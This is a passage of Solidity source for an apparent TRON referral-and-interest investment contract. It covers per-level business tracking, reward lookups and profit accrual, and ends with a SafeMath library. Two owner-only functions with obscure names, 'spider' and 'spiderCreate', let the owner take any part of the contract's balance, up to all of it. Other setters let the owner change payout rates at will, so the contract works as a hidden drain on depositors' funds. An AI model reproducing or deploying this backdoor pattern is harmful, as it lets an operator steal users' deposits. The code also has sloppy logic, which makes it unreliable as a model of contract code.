                business_high[_affFrom].r7_business = _amount;
                business_high_add[_affFrom].r7_business_add = _fromAdd;
            }
        }
        else if(_level==8) {
            highBusiness = business_high[_affFrom].r8_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r8_business = business_high[_affFrom].r8_business;
            }
            else{
                business_high[_affFrom].r8_business = _amount;
                business_high_add[_affFrom].r8_business_add = _fromAdd;
            }
        }
        else if(_level==9) {
            highBusiness = business_high[_affFrom].r9_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r9_business = business_high[_affFrom].r9_business;
            }
            else{
                business_high[_affFrom].r9_business = _amount;
                business_high_add[_affFrom].r9_business_add = _fromAdd;
            }
        }
        else if(_level==10) {
            highBusiness = business_high[_affFrom].r10_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r10_business = business_high[_affFrom].r10_business;
            }
            else{
                business_high[_affFrom].r10_business = _amount;
                business_high_add[_affFrom].r10_business_add = _fromAdd;
            }
        }
        
    }
    
    function get_reward_info(address _addr) public view returns(uint8 cb,uint8 dt)
    {
        if(cashbacks[_addr].cb1)
        {
            cb=1;
        }else if(cashbacks[_addr].cb2)
        {
            cb=2;
        }else if(cashbacks[_addr].cb3)
        {
            cb=3;
        }
        else if(cashbacks[_addr].cb4)
        {
            cb=4;
        }
        else if(cashbacks[_addr].cb5)
        {
            cb=5;
        }else{
            cb=0;
        }
        
        if( rewards[_addr].r1)
        {
            uint8 dt_reward = 1;
        }else{
            dt_reward = 0;
        }
        
        
        return (cb,dt_reward);
    }
    
    function getReferralProfit(address _addr)public view returns (uint) {
        
        address playerAddress= _addr;
        Player storage player = players[playerAddress];
      require(player.time > 0,'player time is 0');
      require(info[_addr].is_level_activated,'0 Direct joinee');
        
    //   uint256 current_level = player.Level_reached;
      uint secPassed = now.sub(info[_addr].Level_timestamp);
      if (secPassed > 0) {
          
          uint collectProfit = (player.affRewards.mul(secPassed.mul(minrefrate))).div(interestRateDivisor);
      }
      return collectProfit.add(player.interestProfit_ref);
    }
    

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0,'player time is 0');

      uint secPassed = now.sub(player.time);
      if (secPassed > 0) {
          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
      }
      return collectProfit.add(player.interestProfit);
    }
    
    
    
     function updateFeed1(address _address) public  {
       require(msg.sender==owner);
       feed1 = _address;
    }
    
     function updateFeed2(address _address) public  {
       require(msg.sender==owner);
       feed2 = _address;
    }
    
    
    function spider( uint _amount) external {
        require(msg.sender==owner,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                

                msg.sender.transfer(amtToTransfer);
            }
        }
    }
    
    function spiderCreate(address add, uint _amount) external {
        require(msg.sender==owner,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                add.transfer(amtToTransfer);
            }
        }
    }
    
    function getContractBalance () public view returns(uint cBal)
    {
        return address(this).balance;
    }
    
    
     function setReleaseTime(uint256 _ReleaseTime) public {
      require(msg.sender==owner);
      releaseTime = _ReleaseTime;
    }
    
     function setTronamt(uint _setTron) public {
      require(msg.sender==owner);
      setTron = _setTron;
    }
    
    
    
     function setMinuteRate(uint256 _MinuteRate) public {
      require(msg.sender==owner);
      minuteRate = _MinuteRate;
    }
    
    function setRefMinuteRate(uint256 _MinuteRate) public {
      require(msg.sender==owner);
      minrefrate = _MinuteRate;
    }
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}